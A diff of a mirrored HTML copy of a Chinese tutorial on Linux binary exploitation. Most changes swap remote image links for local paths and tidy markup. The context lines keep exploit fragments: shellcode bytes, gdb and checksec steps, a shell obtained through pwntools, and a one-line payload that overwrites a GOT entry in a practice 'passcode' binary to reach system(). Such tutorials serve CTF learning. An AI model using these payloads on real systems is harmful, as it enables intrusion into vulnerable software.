@@ -3,14 +3,14 @@
 			<head>
 			     <title>linux常见漏洞利用技术实践 - 君莫笑</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/binary/6521">http://drops.wooyun.org/binary/6521</a></h1>
 				
       <p>
-        <h1>0x01 前言</h1>
+        </p><h1>0x01 前言</h1>
 
-<hr />
+<hr>
 
 <p><strong><em>1.1 目的</em></strong></p>
 
@@ -50,7 +50,7 @@
 
 <h1>0x02 常见漏洞利用技术</h1>
 
-<hr />
+<hr>
 
 <p><strong><em>2.1 利用跳板覆盖返回地址</em></strong></p>
 
@@ -68,7 +68,7 @@
 
 <p>1 拿到程序第一件事就是先运行一下,熟悉要分析的东西(这一点不光是pwn,不管是re还是渗透,先对于目标有个直观了解都是很重要的事)</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420696633.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420696633.png" alt="enter image description here"></p>
 
 <p>程序很简单,就是一个简单的接受输入</p>
 
@@ -77,7 +77,7 @@
 <pre><code>#!c++
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  __int64 v3; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="512335291160">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+  __int64 v3; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="512335291160">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
   char v5; // [sp+0h] [bp-1020h]@1
   char v6; // [sp+1000h] [bp-20h]@1
   int v7; // [sp+101Ch] [bp-4h]@1
@@ -94,7 +94,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 <p>3 接下来我们检查一下程序打开了哪些保护措施</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420692464.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420692464.png" alt="enter image description here"></p>
 
 <pre><code>gdb pwn1
 checksec
@@ -106,7 +106,7 @@ checksec
 
 <p>前面看到了我们输入的数据最终会复制到[bp-20h],我们先尝试输入40个数据,用python生成40个数据</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420718630.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420718630.png" alt="enter image description here"></p>
 
 <pre><code>gdb pwn1
 r           //运行程序
@@ -114,15 +114,15 @@ r           //运行程序
 
 <p>复制生成的输入进去</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420729749.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420729749.png" alt="enter image description here"></p>
 
 <p>看到栈上没有成功覆盖发挥地址</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420721872.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420721872.png" alt="enter image description here"></p>
 
 <p>再次使用八十字节</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420792309.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420792309.png" alt="enter image description here"></p>
 
 <p>可以看出从第四十个字节开始的八个字节就会覆盖返回地址</p>
 
@@ -163,7 +163,7 @@ buf += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"
 <pre><code>jmpcall rsp
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420787413.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420787413.png" alt="enter image description here"></p>
 
 <p>我们就采用第一个地址, 注意64位系统,和little endian</p>
 
@@ -200,7 +200,7 @@ io.interact()
 
 <p>已拿到shell</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420852558.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420852558.png" alt="enter image description here"></p>
 
 <p><strong><em>2.2 GOT覆写</em></strong></p>
 
@@ -277,13 +277,13 @@ int main(){
 <pre><code>objdump -R passcode
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420895882.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420895882.png" alt="enter image description here"></p>
 
 <p>即可获得<code>printf()</code>在的地址<code>0804a000</code>这是攻击目标,</p>
 
 <p>然后打开gdb,运行到调用system()的地方,为什么我们可以直接使用这个地址呢,因为linux下面的程序默认没有随机化code段,</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420819424.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420819424.png" alt="enter image description here"></p>
 
 <p>要写入的值即为 <code>0x080485e3</code></p>
 
@@ -295,7 +295,7 @@ python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
 
 <p><code>134514147</code>即为<code>0x080485e3</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420925019.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420925019.png" alt="enter image description here"></p>
 
 <p>成功改变了程序流程,读出flag文件的内容,注意这里需要你新建一个名叫flag的文件</p>
 
@@ -372,9 +372,9 @@ python url.py
 
 <p>成功利用</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502420928609.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015062502420928609.png" alt="enter image description here"></p>
 
-<p>从中也可以看到,对于同时开了ASLR和DEP的程序,利用的难度确实高了不少</p>      </p>
+<p>从中也可以看到,对于同时开了ASLR和DEP的程序,利用的难度确实高了不少</p>      <p></p>
     
 			</body>
 		</html>
